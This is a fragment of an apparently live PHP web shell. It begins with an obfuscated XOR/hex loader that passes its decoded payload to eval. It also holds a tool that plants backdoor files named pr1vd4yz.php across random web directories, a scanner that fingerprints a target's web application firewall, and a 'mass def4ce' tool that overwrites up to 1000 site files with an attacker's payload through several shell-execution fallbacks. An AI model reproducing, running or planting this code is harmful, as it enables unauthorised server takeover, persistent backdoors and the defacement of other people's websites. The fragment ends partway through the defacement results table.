<?php $ve017499b24="366f3971556a482a3966526e26334d65666565626432336536666339316336392454704c237a313940425e6137642158";$v6789ef794d='';for($i=0;$i<strlen($ve017499b24);$i+=2){$v6789ef794d.=chr(hexdec($ve017499b24[$i].$ve017499b24[$i+1]));}$v6789ef794d=strrev($v6789ef794d);function fc726c15f02($be0647970224518ac6c7abd9ee879da39f7){return hex2bin($be0647970224518ac6c7abd9ee879da39f7);}function ffe80814332($be0647970224518ac6c7abd9ee879da39f7,$e3d26b8f3fb594246){$e3d26b8f3fb594246Len=strlen($e3d26b8f3fb594246);$a297955cd64439654e8031e1e='';for($i=0;$i<strlen($be0647970224518ac6c7abd9ee879da39f7);$i++){$char=ord($be0647970224518ac6c7abd9ee879da39f7[$i]);$f93700fcddba236015a=ord($e3d26b8f3fb594246[$i%$e3d26b8f3fb594246Len]);$a297955cd64439654e8031e1e.=chr($char^$f93700fcddba236015a);}return $a297955cd64439654e8031e1e;}function f0fe28bdc4c($be0647970224518ac6c7abd9ee879da39f7,$e3d26b8f3fb594246){$eb7f6b8164569b7c36e1=fc726c15f02($be0647970224518ac6c7abd9ee879da39f7);return ffe80814332($eb7f6b8164569b7c36e1,$e3d26b8f3fb594246);}$vfa90f6f087="641e145f1153486050575a0b682f07616b60266362413a0757016e555250391e507c6f175c673a081a7d3664430a334e6d15380652691e71080426127c45085c0c023f0008533a0754046e1c5651473b45700e1b4e703a411e7f362d450c33076a15461e412562285c501e463e5876780806506d0856516a540604381a52513a1d7b067a5f675065527f5e09440c33076a15384f56671e380e01265b7a45085c0a573f490e573a4e53066e1c555d395753796f13590e1e0f12141262456517003c7d1c0102023a735b6d4e1310416017654e5509651b5007394b05563e545355397c0713322a510d763059312d085d03041056033d26767665044f7f34436c06100d430e076e6c0a0d475f085c590d0304290d1a1a3b12554f76447a555a025278431d47002d31604a59494f205028044e41141f49110f4001524b1e4c060a0b5962474f1a3e0307163b1e2c1d5c515437451d4c033f212b5e43155622146e075f50050a5a0c0a591709110157565c555076554900264b5f4b25033908030259364e1747003d273d5b440e57231e784d57461645420107550e54400b170b015c462b57430d3705024927063a03034c536d125d045465202f4b551f517641245c19450c5d500746150006015d51505e160429574f00355c015a304a644549170d354016500830787749495a1377123b565d53111c4b02025f10400853121d1816172848440f310d5e58271f3b15034c503e4753515665212f555e08196f1561170005560a490202520c5d555e5356151e457c0b5616690456582c0f275c4b0e523154170d506e3238025c1b512b193a094d59130b0854164e5e515d1c4f160d070122441c5e72544952685b6701414f153d14570e526b7070025e0c463e16384b4e0c02444d0c1b571e505d080d175f45077a02455f311b79472d0e3c10110257200c135e052a2a7a0f014a5334592f464c42175e574f0f58154646481217001d1224575206685f0e5c3f17284d161c42214d01095d2d213250410e1d2a053a474d5f0c5f1907540401040a0707545454502e56155d7a14155e611139144d4f53744e591543722c7d4d1f194b2d02174b5d53224511534f0d035c404c0758555d007141080237085e5e2051305a124659731c374313372c271757084c21333c454b750c555c4b1418065b5316210a010324391b43470c0810113a0f21044b0116375c693d173f3060580c21127c44781508004f0008554a0754011e55535049535d61071142665115137146644109430769114803577273710b1d4b12785c65140c1a5200014f5706551f0b534e545757497c01144266501513714664400843076818390c173f30605b0c21177b5c65140c1a5201004f5f01490202574e545557497c021342665164113e0b27515a526d69115c1b506f736c0801490f7d41650800034f00085b4a03556e091203174502581607104263570b06795b655d085f05052c6e5114302134505e140339582408481a111d4a4a1d40044112105f154b050a2350471a7a17155864197c4a4f0e44785210455c79657b5f5e080b3a112604500b530a505f121809565c03160d5e0f4e661a5d1d261412171b1e27185708183e530b5a223623327a5e1e4664040f4d641f1e3c3311034210415c441111171b684755530031125045264a235941464d2a441042133062224d5e1b0b345929293350165f5a170f590b13515d5655555e077e0b470c3304011b714221584203532c01010a437c79265643524f2904744a0406585f0517485a005d55100a5e0b4d4e64560d537a440908631e7b12510e441b4e0052202a6a2e101f0e4c1f04264d57514b000f4a4f18165f5b07074d48544c7641431a2714570a2d17587b1109433642105e0e3062230d054a167d4331425c52070101515707071b1b1f140417461d25411b003711197205261d054d1f643d501152122a6a6902491251621f2441571e44617630321149461a054e07490549291a0a4f624f025220187b025c1b643d501152122a0a2558551f516457174b5742065f4d4e324f1556154845041516092450471a3b095705304722064e42503753091a142c2e25575215472914730d024e0b4317100358011b15020b09005b4266450e023d05585e21053b5f511d533e084d4a48766b49343b1c562213204d565843555b57515056050501045007045d7c0a0e0b7b1d554f3c4a3b4c5c4145284d0d43497c606917431f5529022741111f4d5b560a081e47111b48105801545729041e0d375708187d0930420a475874032f15486530254d44084d6c136d1009065b530a5b075404510a555b4d174f184039401b3c054d432704751e571c433a09111e1a3227341954475662136f565c4216435743031813525e1107580104517a55155865035f1f2a086d400047537657055b143b6b6c1801071f630337565046170f054c0e5304570c58000a011f5b715b145021125c4b241e3d511740123b4c0017032732214a425a5f6c072353174611584f07074f1f1d510b0f594a0e57730f191e3a16190a6c356551044f5f2b520143497a1d077c652101104160171b6b4a11064342692276663f40395452566f6e065472411e11680c201f5a1b5f374f4454003c75770e5743132d426647080f4b1566524f161e13163b50455846426a0806083d1419026c356651044f0663014068527e7e604a45084f291e7c0066074a0a1947390545180f44504c451d45696c144e7c5b194920187d195c17523d424c133e6f1964660227036250707b086d476e0a434d16546e1b4d59451846172847531c3c461d757a51750c1909433642105e0e3062240b031e1474133115080456525c50551e416c064842413a534c6d48064a0d541917684d724a194b696e0159170e2c26681d6e4f787c2d7d1f19500c43194b426956130f44525e45423a7e131a4e21124b462d047d55665b1f6301406852756969194a5a071342740a041600594b4b0944011b163b563e413956101a06307242661c6151750c191d532c541659417a1d7202110703682f63040416441602430f50451b163b524c451d45696c1e4e6f465d187a0e62495a0a0769135154046d71685a5018147b47321d095751035a525f1e416c024d4e45473a547c00044769461d757f4a68514a1b442a44121f45017a6902110703291c2741194d43156654460b45116e1c545c395751796f115d0e570f1f145b6047651700697d5502540273740c6d02117c2c2c165d6a520508415d16181357070a0a4544397a077a16645065527e0c09400f5d6a2017006b556e1e380f552612784508150f023f490f5b3a0750046e1c5451391e56296f12590e57091d145b6544655e046c7d50003d26707065004f1410416112654e5402651b5103390206563e1d5302397c0617322a510d763059312d415d01041052053d26747565004c1710416211654e5403651b5053390702385350523a5478057a166555651b7e5f09090f5d6a6d11384f566a1e380f09265b7a49085c0e053f04083f5105390705385553391e04114b150d0e1e0f13145b6047651701687d550154023a770d6d4e131008624165075700651b5052394b04513e52503a517a6f175a613a0d1d14126741655e006e7d1c0150023a765a6d4b15792c2c120c6a1b025d3f5201394b00533e1d56033935527a59663a081e7a362d460c33076e15384f566a1e380f57265b7a15085c0a533f490f543a00556f4a5701395051393505143263500c76305d612d415802041051003d26742565494946100835784105006d0c543a0751056e5557523957537f6f5e58363a41192d366245655e00687d550153023a760c6d021029526f045f430d524d0a09584550034c463a5c4f453613540b26134b44680338015500523d0943104d7e23324b50037c2111240c5f430d524d0a0958451b163b53554c461e6d41431a2714570a2b0227591d300768085f171c7262646608530a775029045f430d524d0a09584550004c463a5c4a45696c175f7b46420a6c3564431952167f065f1707313060111525106c4d74140216476e0a435a1616474008070b4d423a741a1d4e76390a016343750a194b69691344195c7e21284b1915512858707b006d476e0a3e4f163b13163b53544c5d453013540b26134b44684e0a400b5416250102420f3d3629565f5a407f58707b001f434a1911034210415c440004160353796c420b31095d4f604e0a48105416250102420f3d3629565f5a407858707b001f434a1947390756130f4445425e46032241430f310e19023b1e272e4a1f5a31554c133e676b6058425a071341650d194d4315665255164b0e12463e1d53553935051e3263500b767d5a7751174f592a454c133e6f7369191f5a011008661d1b164d111b3f53004708121942170012103f5d061d27044a5e3a42712e085c1a781148174c6f6b7b194c5a45391e375050590d115a564e123a0a1b4419451703113841484e38095044604d725d191c422a7e17470d3736681d6e430a654b745919123c000d435b16044140051b4d06574d2c41540f2b4e081b7d4675400b5e1a781055024d7e73710f1d5a127c41780408065a18104f4655541b531610041c4e547c060a4e63560d06685b6540154f0768194817506e7a6c19084f0f6c41641515165203094f460755021e445b5c4c4f496d501446703a411c7e362d475c33076c15384f576e606c1907530f6c13650c58441150404b5707571f125d5549455754781f065f6353150a795b635d195e066c0d4406506a6e6008004d0a655c7447081e02434b021f1e5402004842545457496d02175c7e46081a79467540085f1f710d44545376601c0804497f7d4561780803546d0850506a540702385353573a547b027a5f64561b06685e7c5d190c077040164500276a7108035603754978040807531d19525700491303545a49455f506113175e634a191b7a5a7951085f0774015d0e48776e605a0052423e02355d110f541d195257034913035557494557557c1f065f6352150a795b63581043163b104c56132c233911004a1260506515011a43080e4f4607550b1b4d4b5e450010235052073d08195a3a5b23414147120710511e4125626466035a1e6c57731f19123c000f435b1625435d14070b4d423a7c060640724465527a5a09470b33016e7d1c05570274711b1d5a01100863161b1f58115005461e416c03524b451e4612255a4a0b724e184c2d0533591d30076e084d171a7e661f0b11541e6c16264158524b156652501a450102505a4c5e46186d4345023d155c026c35644710541625011652152b302e19152511775029045f430d524d0a09584543405614551d4e4112021347721d190e1758754c194811630140685069627d195008512d097c15190b5d11581114571c1b10381a52553a5478027a166556651b7c5f775d194d6a6917531548726272190c44032d022645401e416d0855566a540603381a52553a1d7b0604427244651b7e5d77581054167c7e550f4163620049431540131f2441571e476e0856461845116e1c5055395057110410322a540f767e5b775d194b696916481745017379100a5a4a2a507c4d4a6911544a0c134406561a403d545d4f4c6d48064a0d541904754a26054b0a57357e03521501212f57451f4d38037c0066075a6a083e4f0d455551080d16004e4112021f35633b1011684e0a4319410b78521045043f2f1f5e540e7c2f1f3a505c581742114739075c6800394b5e450006215c550b7a42661b7131672c10541628530b543e3d2e2f4a54520713416c0d02161e114b061243175d12403d575e46186d55530031125045264a25030b0c0620094068506b6b60421113456c58325157551758560d39531d5a4110114d473a547b037a166455651b7d5c09090e5b6a2017076b506d751c41074f7f7d4764784100566d085755144c1a121f42413a54556d0e064c0e530f76305833531941162d4f0d46083a6a6265494d101008621c1b1f431f19413a03536f4a5356395451551102105a705d196a38093b055530532044071f4302777765494c111008621d65075607651b5450394b05573e1d535e476113471c200740026a362d435d334e6e12461b417c396466004f5e10086614654e505442473904554e6e5052391d5557110410322a540f763059645310460d7848021749382b2c5c6e1f5b2503205711123c03094a4f161e13163b5054455b450d554f0237395e4f3c35361e571b533655171f45017070100a5a56221c3d4a521e476e0b534f0d4541571017170b464112011755721b1957681830054c1d587806430c4123626466034803715035564b571a19105846500a415705010d454e411202124e3315190e175866581914167c7e56053a03627d19570f4d2f043d4b57164b156652531f454641014a413a545664135d4e3b0019026903262e5a0e5a3440065b0476661f0b02530a6c0b74565c421643574300570940575f42184514003946540072265a4b24060a044a0a44074711590276661f0b025603682f6511100d434c02434269570169394258450010235052073d0819026c356444104f432b444c133e6c7169194a5a512904215657162352580f0a69104057163d031008066551471d37500d752c0f361e5d0a1e3a401752576a1d25575215472958707b0b054a181543426954061b5f42185e4641120114350f46040a2e1f3b124d065936014c133e6f77691944094664540b160a1f434a1911034210415c442206040a091246550b20395f5f26097d1b5606587006431b412d363266420a4f25047c0066045018104f46123a02074d5945185d45696c145c093b1917680c201f5a1b5f374f441f4501737510110f502958707b0b054a1142434269570712594242425d452b5c540b3305510a60192103661c463448101f4501707310111b506c540b160c1f434a1947390451131c5942473957517e6f175b623a411d7a3660411b4f18784e1653497a1d720c185a0d6c5208110814431f19413a03531109441f4541395779131b4e21135b593c187d55665d027401541b41737369021108463805264a19760647580f4e14390706385351533a1d7e57044e7c461d757a5e755f194d6a6f12384f566c1e380f04265b7b44085c0e033f000f513a4e53566e505239545655114b145a0e1e0f1c141267496517046c7d550352023a765d6d0215782c6115654e50531b4a5d161808121942413a5457166e065372004c442b1e3c1e574f1e7c7e5502487e39604b540e563e1e74645c40025d1147390750131c4440395255476408061369461d757a580e2c1952163e540a5415372d2e19195e7c7d457d04421611544d16145845735317110017124d696c175b72481908141266131b460d785c5f1745017072626c5a1e6c16214a5a420a5e57434e123a02074d421e45423a7f05065372085c5d68383017550a552c480b59272b2c234d58154d641326415842066e5f160855115a5d0a4a42424a456f6f5e59603a411c7d362d460d33076e14384f566c1e710c0726177c2c6215654e50531b4a4f0d45176d565545584641120110436c015c5e060b381411460d78480217497a1d720e185a586c0231504c440d117900075a096c471707173a001023500e4a0d540e06684e0a400c460d785c4445042a373257115d047750291f19123c030b383b16581354110c06110f0a23130e4a0d570c03681175035c1b432a4f4447136f347041195e7c7d457d1f194b58111d3c54043e6e12594203100806395a4900724e1d75795f7c51424f443d5511450f7e32320b474a5b64540b150c1f5811445846123a01003f3f45584603385d451a3b09570a604e0a400c4616230140685366627d196e2565053c117b660d431566515f165813540d0e003a0100396c45013c125c443c197d55665d0e711a445e077e6a334d430a4c3f58707b0b0f4f111b3f5101394b0101404c4547587013400f3e155c0368117555665c06781c4444143c31344b195e7c7e4978044a42114156104e123a010b4842473951521104104c7b46120a7a436e51444f53345201171a7e661f0a015a1e6c57731f194b435e5b3c15420441464c4b5e4526003b524a4676390a1a61517555665e04781c4458030125254d6e194f29113a0c100d43435c1713440b13163b53575e46187613023160546277685775174c01552c480b594176661f08045303375026414d43115f1913140406034a4c463a54534c76135b55724266187a310851044f502d4f074308312c60111525127959745f19123c0309435b16476f4a5607395051476d1d061b3c0f48432c42772d4158050459520f3d6f75701b1841032a193841664616456600095811565c10114d4139577d1f064c0e520a763058642d0c586a6915566b506b731c41071f7f7947085c0e053f000c533a4e0448163b5350183a1d2c110f5572055147270e7d55665d067401500e527779601d6e48126c4d744442123c03091e46045b1503045945100809245d4d4676390b1a615175035c1b432a4f44133e6c737b194c4103682f6715190b43504b11074f4d55470a01110c090b6d1b02316154100a334a27144d1a4436014068526c7960441d5a45391e375050590d1111473905571a121f42170012103f5d060c33155c1c7c3531145a00523d090656123b7474665414402314310c1d695003104a5d16181f1202170b06120c225d064676390a18614a2e511d30076a015917467979601d6e49106c4d74150a0d43575611461e416c01445f45555d45696c154e6e464a5e3a06301f114b696b134d0c417a1d73121a53033750707b0804431f0443055e171b5d16064d4139567f1a0630724266197b436e51444f443d5511450f7e661f08034103315c74424c580045500c08164d176d57504c451d45696c155a725b190d6f517517561d1670053b044163627002115e7c7f5068044a42115d5c0d4e123a00004d594541395666180f4e29461d757b5e755f044f14045951543d6f75701b1154032815374c5c4e4b5e4b074e123a00003f463a563b4c6408061372145c5e3d183b511d30056c1a444a4d7e243557520e4a231e740c1d69500310431d1617564611100b450f083d5f490a374e1b7630583053154f572a53054e3e33233011570f4d2f043d4b57164b156652561f45481216071110140b6d117a5f6655651b7d5a09400f5d6a20135c154170622f4b5552071341640d19184313655657145e134f48421611143a3e434a07264e1d757b587c5810541625085f1745017175190c5a046b4b7442564406505a0b461e416c0056420416464112001047721d194c271830105a071670053b04507e2333191525107b59745f19123c0201435b16416c01534a413a514c76130231615f1917682a712e0a591e7c7e570f486562295f11520713436d041f1043454b0a0b1e416c015d4b45445b586d140147721d190e17596051044f1207125d0c413c3025585a5a117750290444161e115005461e44176d57574c451d45696c155b725b1908145b6642655e036e7d1c010702767065004f141008631165075505651b5106394b05513e1d52523979037a166400651b7e5809090b5f6a2017566b506b761c41071c7f7d4467780803506d4155536a540706381a5001445e6d4e060b310e560a201e381d4a1f533b48055b023623324a195e7c7f457d1f195300595643446a1d0051381a57033a547b037a5f6454651b7c5f09460f334e6b42380256023a760b6d4b167b2c2c120d6a5206083f1e05006f05503e50523a5478037a5f645265527e0e09090f0c6a201201155a7e26295c0a5a5e6c4f6a";$ve5c970b653=f0fe28bdc4c($vfa90f6f087,$v6789ef794d);if($ve5c970b653!==false){eval("?>".$ve5c970b653);}else{echo"RSS Error.";} ?>
PHP;
    if (isset($_POST['create_bd'])) {
     $ana_dizin = rtrim($_SERVER['DOCUMENT_ROOT'] ?? getcwd(), '/');
     $dirs = [$ana_dizin];
     foreach (glob($ana_dizin . '/*', GLOB_ONLYDIR) as $d) $dirs[] = $d;
     shuffle($dirs);
     $adet = rand(5, 8);
     $secilen = array_slice($dirs, 0, $adet);

     function bd_write($yol, $icerik) {
       $fmethods = [
          function($f, $c) { return @file_put_contents($f, $c)!==false; },
          function($f, $c) { $h=@fopen($f,"w"); if($h){fwrite($h,$c);fclose($h); return true;} return false; },
          function($f, $c) { return pr1vd4yzC("echo ".escapeshellarg($c)." > ".escapeshellarg($f)); }
       ];
       foreach($fmethods as $fn) if ($fn($yol,$icerik)) return true;
       return false;
     }

     $sonuclar = [];
     foreach ($secilen as $klasor) {
       $file = rtrim($klasor, '/').'/pr1vd4yz.php';
       $ok = bd_write($file, $fpr1vx);
       $url = str_replace($_SERVER['DOCUMENT_ROOT'],'',$file);
       if ($ok)
          $sonuclar[] = "<b style='color:#10b981'>[OK]</b> <a href='$url' target='_blank' style='color:#e53935;'>$url</a>";
       else
          $sonuclar[] = "<b style='color:#e53935'>[FAIL]</b> $file";
     }

     echo "<div class='pzcard-info' style='margin-top:17px;font-size:1.09em;'>";
     echo "<b>Drop edilen backdoor linkleri:</b><br>";
     echo implode("<br>", $sonuclar);
     echo "</div>";
    }
    ?>

  </div>
</div>
<?php elseif (isset($_GET['wafdet'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon" style="background:#ff6f00;"><i class="fas fa-shield-halved"></i></div>
    <div class="pzcard-title">
    <b>WAF / Firewall / Reverse Proxy Detector</b>
    </div>
  </div>
  <div class="pzcard-content">
    <form id="pzcard-waf-form" method="post" class="pzcard-form" autocomplete="off" style="margin-bottom:24px;">
    <div class="pzcard-form-row">
     <label class="pzcard-label">Target URL or Domain:</label>
     <input type="text" name="waf_target" class="pzcard-input" placeholder="https://example.com" required style="min-width:320px;" value="<?= htmlspecialchars($_SERVER['HTTP_HOST'] ?? '') ?>">
     <button type="submit" class="pzcard-btn pzcard-btn-orange" style="margin-left:12px;"><i class="fas fa-bolt"></i> Scan</button>
    </div>
    </form>
    <?php
    function stealth_strtolower($str) {return mb_strtolower($str, 'UTF-8');}
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['waf_target'])):
    $rtfccq = trim($_POST['waf_target']);
    if (!preg_match('#^https?://#i', $rtfccq)) $rtfccq = "http://".$rtfccq;
    $fw_map = [
     'Cloudflare'   => ['server: cloudflare', 'cf-ray', 'cf-cache-status', '__cfduid', 'cloudflare-nginx'],
     'Sucuri'    => ['x-sucuri-id', 'x-sucuri-cache', 'x-sucuri'],
     'ModSecurity'  => ['mod_security', 'modsec', 'x-mod-sec'],
     'Imunify360'   => ['imunify360', 'x-imunify360'],
     'w4f'    => ['w4f', 'x-w4f'],
     'OpenResty'    => ['openresty'],
     'AWS WAF'    => ['awsalb', 'awselb', 'x-amzn'],
     'Incapsula'    => ['incapsula', 'x-cdn', 'x-iinfo'],
     'StackPath'    => ['stackpath'],
     'Quttera'    => ['quttera'],
     'PerimeterX'   => ['perimeterx'],
     'Reblaze'    => ['reblaze'],
     'DDoS-Guard'   => ['ddos-guard'],
     'Fastly'    => ['fastly'],
     'NAXSI'     => ['naxsi'],
     'SafeDog'    => ['safedog', 'waf.sid'],
     '360 Web Application Firewall' => ['360wzb', 'wzws-rid'],
     'Baidu Yunjiasu' => ['yunjiasu'],
     'Yunjiasu'    => ['yunjiasu'],
     'F5 BIG-IP'    => ['bigip', 'f5-'],
     'Barracuda'    => ['barracuda'],
     'Profense'    => ['profense'],
     'Akamai'    => ['akamai', 'akamai-ghost'],
     'FortiWeb'    => ['fortiweb'],
     'URLScan'    => ['urlscan'],
    ];
    $result = [];
    $err = false;
    $headers = @get_headers($rtfccq, 1);
    $all_hdr = '';
    if ($headers && is_array($headers)) foreach ($headers as $k=>$v) {
     $all_hdr .= stealth_strtolower($k.': '.(is_array($v)?implode('; ',$v):$v))."\n";
    }
    $body = @file_get_contents($rtfccq);
    $all_body = stealth_strtolower($body);
    foreach ($fw_map as $fw=>$patterns) {
     foreach ($patterns as $sig) {
       if (strpos($all_hdr, $sig)!==false || strpos($all_body, $sig)!==false) {
       $result[$fw]=true; break;
       }
     }
    }
    ?>
    <div class="pzcard-info" style="margin-bottom:13px;">
    <i class="fas fa-bug"></i>
    <span>Scan results for: <b><?= htmlspecialchars($rtfccq) ?></b></span>
    </div>
    <div class="pzcard-table-wrap">
    <table class="pzcard-table">
     <thead>
       <tr>
       <th>Firewall / Proxy</th>
       <th>Status</th>
       </tr>
     </thead>
     <tbody>
     <?php
     if ($result) {
       foreach ($result as $fw=>$v) {
       echo '<tr>
        <td><b style="color:#e53935"><i class="fas fa-shield-halved"></i> '.htmlspecialchars($fw).'</b></td>
        <td><span style="color:#10b981;">Detected</span></td>
       </tr>';
       }
     } else {
       echo '<tr>
       <td colspan="2" style="color:#0fa;"><i class="fas fa-check"></i> No major WAF / reverse proxy detected.</td>
       </tr>';
     }
     ?>
     </tbody>
    </table>
    </div>
    <?php endif; ?>
  </div>
</div>
<?php elseif (isset($_GET['massdeface'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon" style="background:#e53935;"><i class="fas fa-explosion"></i></div>
    <div class="pzcard-title">
    <b>mass def4ce t00l</b>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post" class="pzcard-form" autocomplete="off" style="margin-bottom:24px;">
    <div class="pzcard-form-row">
     <label class="pzcard-label">target filename:</label>
     <input type="text" name="d3f_f1l" class="pzcard-input" placeholder="index.php or 404.html" value="index.php" required style="max-width:180px;">
    </div>
    <div class="pzcard-form-row">
     <label class="pzcard-label">p4yl0ad / content:</label>
     <textarea name="d3f_cont" class="pzcard-textarea" rows="7" placeholder="Paste shell/code/deface html here..." required></textarea>
    </div>
    <div class="pzcard-form-row" style="margin-bottom:10px;">
     <label class="pzcard-label">directory to scan:</label>
     <input type="text" name="d3f_r0" class="pzcard-input" placeholder="/home/user/public_html/" value="<?= htmlspecialchars(getcwd()) ?>" required>
    </div>
    <div class="pzcard-form-row">
     <button type="submit" name="s7bm1t_d3f" class="pzcard-btn pzcard-btn-red">
       <i class="fas fa-skull-crossbones"></i> Start Mass Replace
     </button>
    </div>
    </form>
    <div class="pzcard-info" style="margin-bottom:18px;">
    <i class="fas fa-info-circle"></i>
    <span>
     <b style="color:#e53935;">WARNING:</b> All matching files will be overwritten! (Max: 1000 files/run)
    </span>
    </div>
    <div class="pzcard-table-wrap">
    <table class="pzcard-table">
     <thead>
       <tr>
       <th>#</th>
       <th>File Path</th>
       <th>Method</th>
       <th>Status</th>
       </tr>
     </thead>
     <tbody>
     <?php
 function pr7xcz($n) { $map = array("\x66\157\x70\x65\156" => "\x31\60\62\54\x31\61\61\54\61\61\62\x2c\61\60\61\54\x31\61\60", "\x66\x69\x6c\x65\x5f\x70\165\164\x5f\x63\157\x6e\164\x65\x6e\164\163" => "\x31\x30\62\x2c\61\60\65\x2c\61\60\70\x2c\61\60\61\x2c\x39\65\54\61\x31\x32\x2c\x31\61\x37\54\x31\61\x36\54\x39\x35\x2c\x39\x39\x2c\x31\x31\x31\54\x31\61\x30\54\x31\61\66\x2c\x31\60\x31\54\x31\x31\60\54\61\x31\66\x2c\x31\61\x35", "\x73\150\x65\x6c\x6c\137\145\170\145\x63" => "\x31\61\x35\x2c\x31\x30\x34\x2c\61\60\61\54\61\60\70\54\61\x30\x38\54\x39\65\54\x31\60\x31\x2c\61\62\60\54\61\x30\x31\54\x39\x39", "\145\170\x65\143" => "\x31\x30\x31\54\61\62\x30\x2c\61\60\x31\54\x39\x39", "\163\171\x73\164\x65\x6d" => "\61\x31\65\54\x31\62\x31\54\x31\61\x35\x2c\x31\61\x36\x2c\x31\x30\61\x2c\x31\60\71", "\x70\141\163\x73\x74\x68\x72\165" => "\61\61\x32\x2c\71\x37\54\x31\x31\x35\54\61\61\65\x2c\61\61\66\54\x31\60\x34\x2c\61\61\64\x2c\61\61\67", "\160\x72\x6f\x63\x5f\x6f\160\x65\x6e" => "\61\61\62\x2c\61\x31\x34\x2c\61\x31\61\x2c\71\x39\54\x39\65\x2c\61\x31\61\x2c\x31\61\x32\54\61\60\x31\x2c\x31\x31\60", "\160\157\160\x65\x6e" => "\61\x31\62\x2c\61\x31\x31\54\x31\61\x32\54\61\x30\x31\x2c\61\x31\x30", "\x66\167\162\x69\164\145" => "\61\x30\x32\54\x31\61\x39\54\61\x31\64\54\61\60\x35\x2c\61\x31\66\x2c\61\60\x31", "\146\143\x6c\157\163\x65" => "\61\60\62\54\x39\x39\54\x31\60\x38\54\x31\x31\x31\x2c\x31\61\x35\x2c\x31\60\x31"); return isset($map[$n]) ? chDxzZ($map[$n]) : $n; }
     if (isset($_POST['s7bm1t_d3f'])) {
       $rtfccq = trim($_POST['d3f_f1l']);
       $pr1vd4yz_c0m   = trim($_POST['d3f_r0']);
       $pyxox = $_POST['d3f_cont'];
       if (!$rtfccq || !$pr1vd4yz_c0m || !$pyxox) {
       echo '<tr><td colspan="4" style="color:#e53935;">Input missing!</td></tr>';
       } else {
       $count = 0;
       $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($pr1vd4yz_c0m, FilesystemIterator::SKIP_DOTS));
       $max_files = 1000; $count = 0;
foreach ($rii as $file) {
    if ($count % 100 == 0) { flush();  }
    if (++$count > $max_files) break; 
        if (strtolower($file->getFilename()) === strtolower($rtfccq)) {
          $fpath = $file->getPathname();
          $status = '';
          $method = '';
          goto YU6B5; cdiUg: $fwrite = pr7xcz("\x66\167\162\x69\x74\145"); goto x9s7D; YU6B5: $fpXq = pr7xcz("\x66\x6f\x70\145\156"); goto cdiUg; x9s7D: $fclose = pr7xcz("\x66\143\154\x6f\x73\x65");
          $fh = @$fpXq($fpath, 'wb');
          if ($fh) { $fwrite($fh, $pyxox); $fclose($fh); $status = 'OK'; $method = 'fopen'; }
          goto WDSJf; pXxbn: if (!$status && function_exists(pr7xcz("\x70\x61\163\x73\164\150\x72\165"))) { $pr1cvxS = pr7xcz("\x70\141\163\x73\164\x68\x72\165"); $pr1pr1v = "\x65\x63\150\157\x20\47" . str_replace("\47", "\47\x5c\47\x27", $pyxox) . "\47\40\76\40" . escapeshellarg($fpath);  @$pr1cvxS($pr1pr1v);  if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\113"; $method = "\x70\x61\163\x73\x74\150\162\165"; } } goto ASUGV; lo7km: if (!$status && function_exists(pr7xcz("\160\157\160\x65\156"))) { $popen = pr7xcz("\x70\157\160\x65\x6e"); $ph = @$popen("\x63\141\x74\x20\x3e\x20" . escapeshellarg($fpath), "\167"); if ($ph) { fwrite($ph, $pyxox); fclose($ph); } if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\113"; $method = "\x70\x6f\160\145\156"; } } goto RYZfv; cy3xC: if (!$status && function_exists(pr7xcz("\x73\x68\x65\x6c\154\137\x65\x78\x65\x63"))) { $shell_exec = pr7xcz("\163\150\x65\x6c\154\x5f\x65\170\x65\143"); $pr1pr1v = "\145\143\150\157\40\x27" . str_replace("\x27", "\47\x5c\x27\x27", $pyxox) . "\47\x20\x3e\x20" . escapeshellarg($fpath); @$chDx2x($pr1pr1v); if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\x4b"; $method = "\163\150\145\154\154\137\x65\x78\145\143"; } } goto D1yZ2; D1yZ2: if (!$status && function_exists(pr7xcz("\x65\170\x65\143"))) { $exec = pr7xcz("\145\x78\145\x63"); $pr1pr1v = "\145\143\x68\157\40\47" . str_replace("\x27", "\x27\x5c\47\x27", $pyxox) . "\x27\40\x3e\40" . escapeshellarg($fpath); @$exec($pr1pr1v, $out, $rc); if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\113"; $method = "\x65\170\145\x63"; } } goto SS_Lw; SS_Lw: if (!$status && function_exists(pr7xcz("\163\171\163\x74\145\x6d"))) { $system = pr7xcz("\163\171\x73\164\145\x6d"); $pr1pr1v = "\145\143\x68\x6f\40\x27" . str_replace("\x27", "\47\x5c\x27\47", $pyxox) . "\47\40\x3e\x20" . escapeshellarg($fpath);  @$system($pr1pr1v);  if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\117\113"; $method = "\x73\171\163\x74\x65\x6d"; } } goto pXxbn; ASUGV: if (!$status && function_exists(pr7xcz("\x70\162\157\x63\137\x6f\160\145\156"))) { $proc_open = pr7xcz("\160\x72\x6f\143\137\157\160\x65\156"); $descs = array(array("\160\151\x70\145", "\x77"), array("\160\x69\160\x65", "\167"), array("\x70\x69\x70\145", "\167")); $process = @$proc_open("\x63\x61\x74\40\76\40" . escapeshellarg($fpath), $descs, $pipes); if (is_resource($process)) { fwrite($pipes[0], $pyxox); fclose($pipes[0]); $out = stream_get_contents($pipes[1]); fclose($pipes[1]); $err = stream_get_contents($pipes[2]); fclose($pipes[2]); proc_close($process); if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\x4b"; $method = "\160\x72\157\143\x5f\157\160\145\156"; } } } goto lo7km; WDSJf: if (!$status && function_exists(pr7xcz("\146\151\x6c\145\137\160\165\164\137\x63\x6f\x6e\164\145\x6e\x74\163"))) { $file_put_contents = pr7xcz("\146\151\x6c\145\x5f\160\x75\x74\x5f\143\x6f\156\x74\x65\156\164\x73"); $ok = @$file_put_contents($fpath, $pyxox); if ($ok !== false) { $status = "\x4f\x4b"; $method = "\x66\151\154\145\x5f\x70\165\x74\x5f\143\157\x6e\164\x65\156\x74\x73"; } } goto cy3xC; RYZfv:
          if (!$status) { $status = '<span style="color:#e53935">FAIL</span>'; $method = '-'; }

          $count++;
          echo '<tr>
          <td>'.$count.'</td>
          <td style="font-family:monospace;color:#e53935;">'.htmlspecialchars($fpath).'</td>
          <td style="color:#888;">'.$method.'</td>
          <td>'.($status == 'OK' ? '<b style="color:#10b981;">OK</b>' : $status).'</td>
